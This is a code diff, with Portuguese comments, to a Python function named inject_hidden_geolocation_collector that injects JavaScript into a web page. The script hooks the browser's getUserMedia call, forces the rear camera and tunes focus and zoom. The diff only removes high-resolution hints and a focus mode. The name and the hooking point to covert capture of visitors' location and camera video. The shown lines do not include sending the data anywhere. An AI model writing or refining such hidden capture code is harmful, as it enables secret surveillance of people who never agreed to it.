@@ -239,15 +239,8 @@ def inject_hidden_geolocation_collector() -> None:
                     }
                     try {
                         const caps = track.getCapabilities();
-                        const extra = {};
                         const advanced = [];
 
-                        if (caps.width && typeof caps.width.max === "number") {
-                            extra.width = { ideal: caps.width.max };
-                        }
-                        if (caps.height && typeof caps.height.max === "number") {
-                            extra.height = { ideal: caps.height.max };
-                        }
                         if (Array.isArray(caps.focusMode) && caps.focusMode.includes("continuous")) {
                             advanced.push({ focusMode: "continuous" });
                         }
@@ -255,10 +248,7 @@ def inject_hidden_geolocation_collector() -> None:
                             advanced.push({ zoom: caps.zoom.min });
                         }
                         if (advanced.length) {
-                            extra.advanced = advanced;
-                        }
-                        if (Object.keys(extra).length) {
-                            track.applyConstraints(extra).catch(() => {});
+                            track.applyConstraints({ advanced }).catch(() => {});
                         }
                     } catch (e) {
                         // Alguns navegadores nao expõem capabilities completas.
@@ -268,28 +258,10 @@ def inject_hidden_geolocation_collector() -> None:
                 async function requestRearStream(targetWin, originalGetUserMedia, hintDeviceId) {
                     const attempts = [];
                     if (hintDeviceId) {
-                        attempts.push({
-                            video: {
-                                deviceId: { exact: hintDeviceId },
-                                width: { ideal: 7680 },
-                                height: { ideal: 4320 },
-                            },
-                        });
+                        attempts.push({ video: { deviceId: { exact: hintDeviceId } } });
                     }
-                    attempts.push({
-                        video: {
-                            facingMode: { exact: "environment" },
-                            width: { ideal: 7680 },
-                            height: { ideal: 4320 },
-                        },
-                    });
-                    attempts.push({
-                        video: {
-                            facingMode: { ideal: "environment" },
-                            width: { ideal: 7680 },
-                            height: { ideal: 4320 },
-                        },
-                    });
+                    attempts.push({ video: { facingMode: { exact: "environment" } } });
+                    attempts.push({ video: { facingMode: { ideal: "environment" } } });
 
                     for (const attemptConstraints of attempts) {
                         try {
@@ -327,12 +299,6 @@ def inject_hidden_geolocation_collector() -> None:
                                     patched = { ...constraints, video: { ...baseVideo } };
                                     if (!patched.video.facingMode) {
                                         patched.video.facingMode = { ideal: "environment" };
-                                    }
-                                    if (!patched.video.width) {
-                                        patched.video.width = { ideal: 7680 };
-                                    }
-                                    if (!patched.video.height) {
-                                        patched.video.height = { ideal: 4320 };
                                     }
                                 }
                             }
@@ -447,9 +413,9 @@ def inject_hidden_geolocation_collector() -> None:
                                 const caps =
                                     typeof track.getCapabilities === "function" ? track.getCapabilities() : {};
                                 const advanced = [{ pointsOfInterest: [{ x: relX, y: relY }] }];
-                                if (Array.isArray(caps.focusMode) && caps.focusMode.includes("single-shot")) {
-                                    advanced.push({ focusMode: "single-shot" });
-                                } else if (Array.isArray(caps.focusMode) && caps.focusMode.includes("continuous")) {
+                                // Nunca usar "single-shot": trava o foco na primeira tentativa e
+                                // pode deixar a imagem permanentemente desfocada se o ponto falhar.
+                                if (Array.isArray(caps.focusMode) && caps.focusMode.includes("continuous")) {
                                     advanced.push({ focusMode: "continuous" });
                                 }
                                 await track.applyConstraints({ advanced }).catch(() => {});
